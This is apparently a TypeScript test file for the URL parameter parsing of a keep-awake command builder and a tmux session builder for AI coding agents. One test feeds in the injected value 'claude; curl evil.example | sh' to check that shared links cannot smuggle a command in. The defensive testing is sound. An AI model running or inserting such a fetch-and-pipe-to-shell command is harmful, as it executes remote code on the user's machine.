import {
  KEEP_AWAKE_DEFAULTS,
  KEEP_AWAKE_DURATIONS,
  KEEP_AWAKE_LID,
  KEEP_AWAKE_OS,
  KEEP_AWAKE_POWER,
  KEEP_AWAKE_PRESET_COMMANDS,
  buildKeepAwake,
  type KeepAwakeInput,
} from "../keep-awake";
import { TMUX_BUILDER_DEFAULTS, buildTmuxCommands } from "../tmux-sheet";
import {
  KEEP_AWAKE_PARAM_KEYS,
  TMUX_PARAM_KEYS,
  mergeSearch,
  parseKeepAwakeParams,
  parseTmuxParams,
  pickOne,
  serializeKeepAwakeParams,
  serializeTmuxParams,
} from "../tool-params";

const input = (overrides: Partial<KeepAwakeInput> = {}): KeepAwakeInput => ({ ...KEEP_AWAKE_DEFAULTS, ...overrides });

describe("pickOne", () => {
  it("returns an allowed value and falls back on anything else", () => {
    expect(pickOne("linux", KEEP_AWAKE_OS, "macos")).toBe("linux");
    expect(pickOne("freebsd", KEEP_AWAKE_OS, "macos")).toBe("macos");
    expect(pickOne(null, KEEP_AWAKE_OS, "macos")).toBe("macos");
    expect(pickOne("", KEEP_AWAKE_OS, "macos")).toBe("macos");
    expect(pickOne("__proto__", KEEP_AWAKE_OS, "macos")).toBe("macos");
  });
});

describe("keep-awake URL parameters", () => {
  it("leaves the default state with no query string, so the base URL stays canonical", () => {
    expect(serializeKeepAwakeParams(input())).toBe("");
    expect(parseKeepAwakeParams("")).toEqual(KEEP_AWAKE_DEFAULTS);
    expect(parseKeepAwakeParams("?")).toEqual(KEEP_AWAKE_DEFAULTS);
  });

  it("writes only what differs from the default", () => {
    expect(serializeKeepAwakeParams(input({ os: "linux" }))).toBe("os=linux");
    expect(serializeKeepAwakeParams(input({ duration: "hours", hours: 12, power: "battery", lid: "closed", command: "codex" }))).toBe(
      "duration=hours&hours=12&power=battery&lid=closed&cmd=codex",
    );
    // The default hours are implied.
    expect(serializeKeepAwakeParams(input({ duration: "hours", hours: 8 }))).toBe("duration=hours");
    // Hours mean nothing until-exit, so they are not written.
    expect(serializeKeepAwakeParams(input({ hours: 12 }))).toBe("");
  });

  it("restores every input from a link, with or without the leading question mark", () => {
    const expected = input({ os: "linux", duration: "hours", hours: 12, power: "battery", lid: "closed", command: "codex" });
    expect(parseKeepAwakeParams("?os=linux&duration=hours&hours=12&power=battery&lid=closed&cmd=codex")).toEqual(expected);
    expect(parseKeepAwakeParams("os=linux&duration=hours&hours=12&power=battery&lid=closed&cmd=codex")).toEqual(expected);
  });

  it("round-trips every combination of the structured answers to the same result", () => {
    let count = 0;
    for (const os of KEEP_AWAKE_OS)
      for (const duration of KEEP_AWAKE_DURATIONS)
        for (const power of KEEP_AWAKE_POWER)
          for (const lid of KEEP_AWAKE_LID)
            for (const command of KEEP_AWAKE_PRESET_COMMANDS)
              for (const hours of [1, 3, 8, 12, 72]) {
                const original = input({ os, duration, power, lid, command, hours });
                const restored = parseKeepAwakeParams(serializeKeepAwakeParams(original));
                // The same command comes out, which is what a shared link is for.
                expect(buildKeepAwake(restored).script).toBe(buildKeepAwake(original).script);
                expect(restored.os).toBe(os);
                expect(restored.duration).toBe(duration);
                expect(restored.power).toBe(power);
                expect(restored.lid).toBe(lid);
                expect(restored.command).toBe(command);
                if (duration === "hours") expect(restored.hours).toBe(hours);
                count += 1;
              }
    expect(count).toBe(2 * 2 * 2 * 2 * 2 * 5);
  });

  it("ignores unknown values and clamps the hours, so an edited link never breaks the page", () => {
    expect(parseKeepAwakeParams("os=windows&duration=forever&power=solar&lid=ajar")).toEqual(KEEP_AWAKE_DEFAULTS);
    expect(parseKeepAwakeParams("duration=hours&hours=999").hours).toBe(72);
    expect(parseKeepAwakeParams("duration=hours&hours=-4").hours).toBe(1);
    expect(parseKeepAwakeParams("duration=hours&hours=abc").hours).toBe(KEEP_AWAKE_DEFAULTS.hours);
    expect(parseKeepAwakeParams("duration=hours&hours=").hours).toBe(KEEP_AWAKE_DEFAULTS.hours);
    // Hours without the duration that uses them are dropped.
    expect(parseKeepAwakeParams("hours=30").hours).toBe(KEEP_AWAKE_DEFAULTS.hours);
    expect(parseKeepAwakeParams("os=linux&os=macos").os).toBe("linux");
  });

  it("never carries a typed command, and never restores one from a link", () => {
    expect(serializeKeepAwakeParams(input({ command: "npm test" }))).toBe("");
    expect(serializeKeepAwakeParams(input({ command: "claude; curl evil.example | sh" }))).toBe("");
    expect(serializeKeepAwakeParams(input({ command: "codex --resume" }))).toBe("");
    // A link that tries to smuggle a command in gets the default command.
    const hostile = parseKeepAwakeParams("cmd=" + encodeURIComponent("claude; curl evil.example | sh"));
    expect(hostile.command).toBe("claude");
    expect(buildKeepAwake(hostile).script).toBe("caffeinate -is claude");
    expect(parseKeepAwakeParams("cmd=npm").command).toBe("claude");
    expect(parseKeepAwakeParams("cmd=CODEX").command).toBe("claude");
  });

  it("keeps the query string free of anything personal", () => {
    const query = serializeKeepAwakeParams(input({ os: "linux", duration: "hours", hours: 6, power: "battery", lid: "closed", command: "codex" }));
    expect(query).toMatch(/^[a-z0-9=&-]+$/);
  });
});

describe("tmux builder URL parameters", () => {
  it("leaves the default state with no query string", () => {
    expect(serializeTmuxParams(TMUX_BUILDER_DEFAULTS)).toBe("");
    expect(parseTmuxParams("")).toEqual(TMUX_BUILDER_DEFAULTS);
  });

  it("round-trips the agent and the logging choice", () => {
    for (const agent of ["claude", "codex"] as const) {
      for (const logging of [false, true]) {
        const original = { ...TMUX_BUILDER_DEFAULTS, agent, logging };
        const restored = parseTmuxParams(serializeTmuxParams(original));
        expect(restored).toEqual(original);
        expect(buildTmuxCommands(restored).script).toBe(buildTmuxCommands(original).script);
      }
    }
    expect(serializeTmuxParams({ ...TMUX_BUILDER_DEFAULTS, agent: "codex", logging: true })).toBe("agent=codex&log=on");
  });

  it("never carries a session name or a typed command, and never restores the other-agent choice from a link", () => {
    expect(serializeTmuxParams({ agent: "other", sessionName: "ash-private-project", otherCommand: "my-agent", logging: false })).toBe("");
    expect(serializeTmuxParams({ agent: "claude", sessionName: "ash-private-project", otherCommand: "", logging: false })).toBe("");
    expect(parseTmuxParams("agent=other").agent).toBe("claude");
    expect(parseTmuxParams("agent=codex&name=x&cmd=y&log=maybe")).toEqual({ ...TMUX_BUILDER_DEFAULTS, agent: "codex" });
  });
});

describe("mergeSearch", () => {
  it("replaces the tool's own keys and keeps every other key, such as utm tags", () => {
    expect(mergeSearch("?utm_source=x&os=linux&ref=abc", KEEP_AWAKE_PARAM_KEYS, "lid=closed")).toBe("utm_source=x&ref=abc&lid=closed");
    expect(mergeSearch("os=linux&lid=closed", KEEP_AWAKE_PARAM_KEYS, "")).toBe("");
    expect(mergeSearch("", TMUX_PARAM_KEYS, "agent=codex&log=on")).toBe("agent=codex&log=on");
    expect(mergeSearch("?gclid=1", TMUX_PARAM_KEYS, "")).toBe("gclid=1");
  });

  it("does not let one tool's keys overlap another's", () => {
    for (const key of TMUX_PARAM_KEYS) expect(KEEP_AWAKE_PARAM_KEYS as readonly string[]).not.toContain(key);
  });
});
